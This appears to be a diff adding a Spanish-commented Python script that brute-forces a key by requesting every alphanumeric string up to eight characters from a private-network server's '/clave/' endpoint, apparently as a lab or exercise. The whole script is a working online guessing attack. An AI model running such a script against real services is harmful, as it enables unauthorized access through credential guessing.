@@ -1,0 +1,65 @@
+import requests
+import itertools
+import string
+import sys
+
+def encontrar_clave():
+    """
+    Función para encontrar la clave probando todas las combinaciones posibles.
+    """
+    # 1. Configuración inicial
+    # Caracteres que se usarán para generar las claves (letras mayúsculas, minúsculas y dígitos)
+    caracteres = string.ascii_letters + string.digits
+    # URL base del servidor al que nos conectaremos
+    base_url = "http://10.41.130.169:5000/clave/"
+    # Longitud máxima de la clave que vamos a probar
+    longitud_max = 8  # Se recomienda empezar con un número bajo (ej. 4 o 5) para probar
+
+    print("Iniciando la búsqueda de la clave...")
+
+    # 2. Bucle principal
+    # Probaremos todas las longitudes desde 1 hasta la longitud máxima definida
+    for longitud in range(1, longitud_max + 1):
+        print(f"\n--- Probando claves de longitud {longitud} ---")
+        
+        # Genera todas las combinaciones posibles de 'caracteres' para la 'longitud' actual
+        # itertools.product es muy eficiente para esto
+        combinaciones = itertools.product(caracteres, repeat=longitud)
+        
+        # 3. Probar cada combinación
+        for combinacion in combinaciones:
+            # Une los caracteres de la tupla ('a', 'b', 'c') para formar un string "abc"
+            clave_prueba = "".join(combinacion)
+            
+            try:
+                # Construye la URL completa
+                url_completa = base_url + clave_prueba
+                
+                # Envía la petición GET al servidor
+                response = requests.get(url_completa, timeout=5) # timeout de 5 segundos
+                
+                # Extrae el texto de la respuesta del servidor
+                texto_respuesta = response.text
+                
+                # Imprime el intento para ver el progreso
+                # Usamos sys.stdout.write y \r para que la línea se reescriba y no sature la consola
+                sys.stdout.write(f"\rIntentando con: {clave_prueba}")
+                sys.stdout.flush()
+
+                # 4. Verificación del resultado
+                # Comprueba si la respuesta contiene un mensaje de éxito
+                if "es correcta" in texto_respuesta.lower() and "no es correcta" not in texto_respuesta.lower():
+                    print(f"\n\n¡Éxito! La clave encontrada es: {clave_prueba}")
+                    return # Termina la función al encontrar la clave
+            
+            except requests.exceptions.RequestException as e:
+                # Manejo de errores de conexión
+                print(f"\nError de conexión al intentar con la clave '{clave_prueba}': {e}")
+                # Puedes decidir si continuar o parar en caso de error
+                # return
+
+    print(f"\n\nNo se encontró la clave con una longitud de hasta {longitud_max} caracteres.")
+
+# Ejecutar la función principal
+if __name__ == "__main__":
+    encontrar_clave()
